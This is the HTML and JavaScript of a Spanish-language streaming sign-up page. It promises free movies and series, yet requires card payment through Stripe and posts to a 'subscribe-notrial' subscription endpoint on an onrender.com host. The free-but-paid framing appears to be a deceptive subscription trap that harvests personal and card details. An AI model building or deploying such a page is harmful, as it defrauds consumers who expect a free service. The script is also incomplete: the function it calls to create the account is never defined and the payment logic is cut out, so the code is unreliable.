<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Transmite tus películas y series favoritas</title>

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>

  <style>
    :root{
      --bg:#111318; --panel:#1b1f27; --panel2:#222733; --text:#eaeef6; --muted:#97a0b3; --accent:#58f; --accent2:#2dd4bf; --warn:#ffd76b; --line:#2b3140; --radius:14px;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;}

    .strip img{width:100%; height:60px; object-fit:cover; display:block;}
    .hero{ max-width:960px; margin:30px auto; padding:0 20px; }
    .headline{ font-size:42px; line-height:1.2; font-weight:900; text-transform:uppercase; text-align:center; margin-bottom:20px; }

    .notice{ background:var(--panel2); border:1px solid var(--line); border-radius:var(--radius); padding:16px; margin-bottom:20px; text-align:center; }
    .steps{ margin-top:14px; display:flex; justify-content:space-around; font-size:14px; color:var(--muted) }

    .form-panel{ background:var(--panel); border:1px solid var(--line); border-radius:var(--radius); padding:24px; }
    .panel-title{ font-size:20px; font-weight:900; margin-bottom:12px; text-align:center }
    .small{ font-size:13px; color:var(--muted); margin-bottom:18px; text-align:center }

    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
    @media (max-width:520px){ .grid{ grid-template-columns:1fr } }

    .input, .select, .el{ width:100%; background:#0f131b; color:var(--text); border:1px solid #2b3140; border-radius:10px; padding:12px; font-size:15px; }
    .input::placeholder{ color:#6f7a93 }
    .btn{ width:100%; border:none; border-radius:12px; padding:12px 16px; font-weight:900; font-size:16px; cursor:pointer; background:linear-gradient(180deg, #7aa3ff, #4572ff); color:#fff; margin-top:15px }
    .btn.muted{ background:#1f2532; color:#cbd3e6; border:1px solid #2b3140; box-shadow:none }

    .step{ display:none }
    .step[aria-hidden="false"]{ display:block }

    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; grid-column:1 / -1 }
    @media (max-width:520px){ .phone-wrap{ grid-template-columns:1fr } }

    .err{ display:none; background:#3a1820; border:1px solid #803246; color:#ffb1bd; padding:10px; border-radius:10px; font-size:14px; margin-top:10px }
    .err[aria-hidden="false"]{ display:block }

    .loading-overlay{ position:fixed; inset:0; background:rgba(3,6,14,.86);
      display:none; align-items:center; justify-content:center; z-index:9999; }
    .loading-overlay[aria-hidden="false"]{ display:flex }
    .loading-box{ width:min(92vw,460px); background:#0f131b; border:1px solid #2b3140;
      border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.25); padding:20px; text-align:center; color:#cdd6ea }
    .loading-title{ font-weight:800; margin:2px 0 10px; font-size:18px }
    .progress-wrap{ width:100%; height:10px; background:#1a2230; border-radius:999px; overflow:hidden; }
    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg,#7aa3ff,#2dd4bf); animation: loadingBar 2.2s ease-in-out infinite; }
    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
  </style>
</head>
<body>
  <div class="strip"><img src="bar.png" alt="barra de películas"/></div>

  <main class="hero">
    <h1 class="headline">TRANSMITE TUS PELÍCULAS Y SERIES FAVORITAS GRATIS</h1>

    <div class="notice">
      <p>Debes registrarte antes de poder ver contenido. Crea una cuenta gratuita.</p>
      <div class="steps">
        <div>1. Información de cuenta</div>
        <div>2. Pago</div>
        <div>3. Disfruta</div>
      </div>
    </div>

    <section class="form-panel">
      <!-- STEP 1 -->
      <div id="step1" class="step" aria-hidden="false">
        <h2 class="panel-title">Únete gratis</h2>
        <p class="small">Por favor ingresa tus datos para continuar.</p>
        <div class="grid">
          <input id="nameInput" class="input" placeholder="Nombre completo" autocomplete="name" required>
          <input id="emailInput" class="input" placeholder="Correo electrónico" type="email" autocomplete="email" required>
          <div class="phone-wrap">
            <select id="phonePrefix" class="select" aria-label="Prefijo internacional"></select>
            <input id="phoneNumber" class="input" inputmode="tel" placeholder="Número de teléfono" autocomplete="tel-national">
          </div>
          <input id="passwordInput" class="input" type="password" placeholder="Crea una contraseña" autocomplete="new-password" required>
        </div>
        <button id="nextBtn" class="btn">Continuar →</button>
      </div>

      <!-- STEP 2 -->
      <div id="step2" class="step" aria-hidden="true">
        <h2 class="panel-title">Pago seguro</h2>
        <p class="small">Los datos de tu tarjeta están encriptados y procesados por Stripe.</p>

        <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Dirección">
        <input id="billingCity" class="input" autocomplete="address-level2" placeholder="Ciudad">
        <select id="billingCountry" class="select" aria-label="País (código ISO de 2 letras)"></select>
        <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Código postal">

        <div id="card-number" class="el"></div>
        <div class="grid">
          <div><div id="card-expiry" class="el"></div></div>
          <div><div id="card-cvc" class="el"></div></div>
        </div>

        <div id="err" class="err" role="alert" aria-hidden="true"></div>

        <button id="backBtn" class="btn muted">← Atrás</button>
        <button id="payNow" class="btn">Comienza a transmitir de forma segura</button>
      </div>
    </section>
  </main>

  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
    <div class="loading-box">
      <div class="loading-title">Procesando tu pago…</div>
      <div class="progress-wrap"><div class="progress-bar"></div></div>
      <p class="small" style="margin-top:10px;color:#97a0b3">Por favor espera, esto puede tardar unos segundos.</p>
    </div>
  </div>

  <script src="https://js.stripe.com/v3"></script>
<script>
  window.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const errBox = document.getElementById('err');
    const nextBtn = document.getElementById('nextBtn');
    const backBtn = document.getElementById('backBtn');

    const phonePrefix = document.getElementById('phonePrefix');
    const phoneNumber = document.getElementById('phoneNumber');

    const billingStreet = document.getElementById('billingStreet');
    const billingCity = document.getElementById('billingCity');
    const billingCountry = document.getElementById('billingCountry');
    const billingPostcode = document.getElementById('billingPostcode');

    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/subscribe-notrial";
    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
    const FIXED_PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W";
    const API_BASE = (location.protocol.startsWith('http') ? location.origin : 'http://localhost:10000');

    function show(o){ o?.setAttribute('aria-hidden','false'); }
    function hide(o){ o?.setAttribute('aria-hidden','true'); }

    const overlay = document.getElementById('loading-overlay');
    function showLoading(){ overlay?.setAttribute('aria-hidden','false'); }
    function hideLoading(){ overlay?.setAttribute('aria-hidden','true'); }

    // ===== Country (ISO) + Prefix data =====
    const COUNTRY_CHOICES = {
      ES:'España', AR:'Argentina', EC:'Ecuador', PA:'Panamá', CR:'Costa Rica',
      CO:'Colombia', VE:'Venezuela', PE:'Perú', BO:'Bolivia', CL:'Chile', UY:'Uruguay',
      GE:'Georgia', US:'Estados Unidos', GB:'Reino Unido', IE:'Irlanda',
      CA:'Canadá', AU:'Australia', NZ:'Nueva Zelanda',
      DE:'Alemania', FR:'Francia', IT:'Italia', NL:'Países Bajos',
      BE:'Bélgica', CH:'Suiza', AT:'Austria', DK:'Dinamarca', NO:'Noruega',
      SE:'Suecia', FI:'Finlandia', PT:'Portugal', PL:'Polonia', CZ:'Chequia',
      HU:'Hungría', RO:'Rumanía',
      BR:'Brasil', MX:'México', ZA:'Sudáfrica',
      IN:'India', SG:'Singapur', MY:'Malasia', TH:'Tailandia', VN:'Vietnam', PH:'Filipinas',
      HK:'Hong Kong', JP:'Japón', KR:'Corea del Sur',
      AE:'Emiratos Árabes Unidos', SA:'Arabia Saudita', TR:'Turquía', IL:'Israel'
    };
    const CALLING_CODES = {
      ES:'+34', AR:'+54', EC:'+593', PA:'+507', CR:'+506', CO:'+57',
      VE:'+58', PE:'+51', BO:'+591', CL:'+56', UY:'+598',
      US:'+1', CA:'+1', GB:'+44', IE:'+353', AU:'+61', NZ:'+64',
      DE:'+49', FR:'+33', IT:'+39', NL:'+31', BE:'+32',
      CH:'+41', AT:'+43', DK:'+45', NO:'+47', SE:'+46', FI:'+358',
      PT:'+351', PL:'+48', CZ:'+420', HU:'+36', RO:'+40',
      BR:'+55', MX:'+52', ZA:'+27',
      IN:'+91', SG:'+65', MY:'+60', TH:'+66', VN:'+84', PH:'+63',
      HK:'+852', JP:'+81', KR:'+82', AE:'+971', SA:'+966', TR:'+90', IL:'+972',
      GE:'+995'
    };

    function populateCountrySelect(){
      billingCountry.innerHTML = '';
      billingCountry.append(new Option('Selecciona un país', '', true, true));
      const priority = ['ES','MX','AR','CO','PE','CL','UY','VE','EC','PA','CR'];
      const seen = new Set();
      const add = (code) => {
        if (seen.has(code) || !COUNTRY_CHOICES[code]) return;
        seen.add(code);
        billingCountry.append(new Option(COUNTRY_CHOICES[code], code));
      };
      priority.forEach(add);
      Object.keys(COUNTRY_CHOICES)
        .filter(c => !priority.includes(c))
        .sort((a,b)=>COUNTRY_CHOICES[a].localeCompare(COUNTRY_CHOICES[b]))
        .forEach(add);
    }

    function populatePrefixOptions(){
      phonePrefix.innerHTML = '';
      const priority = ['ES','MX','AR','CO','PE','CL','UY','VE','EC','PA','CR','US'];
      const seen = new Set();
      const add = (cc) => {
        if (seen.has(cc) || !CALLING_CODES[cc]) return;
        seen.add(cc);
        const code = CALLING_CODES[cc];
        const label = `${code} — ${COUNTRY_CHOICES[cc] || cc}`;
        phonePrefix.append(new Option(label, code));
      };
      priority.forEach(add);
      Object.keys(CALLING_CODES)
        .filter(cc => !priority.includes(cc))
        .sort()
        .forEach(add);
      if (!phonePrefix.value) phonePrefix.value = CALLING_CODES.ES;
    }

    function setPrefixFromISO(cc){
      const code = CALLING_CODES[cc];
      if (!code) return;
      const exists = Array.from(phonePrefix.options).some(o=>o.value===code);
      if(!exists) phonePrefix.add(new Option(`${code} — ${COUNTRY_CHOICES[cc]||cc}`, code));
      phonePrefix.value = code;
    }

    populateCountrySelect();
    populatePrefixOptions();

    nextBtn?.addEventListener('click', async ()=>{
      hide(step1); show(step2);
      try{ await ensureAccount(); }catch(e){
        if(errBox){ errBox.textContent = 'Error al crear la cuenta: ' + (e.message||'verifica los datos'); errBox.setAttribute('aria-hidden','false'); }
      }
    });
    backBtn?.addEventListener('click', ()=>{ hide(step2); show(step1); });

    // Stripe logic unchanged
  });
</script>

  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
</body>
</html>
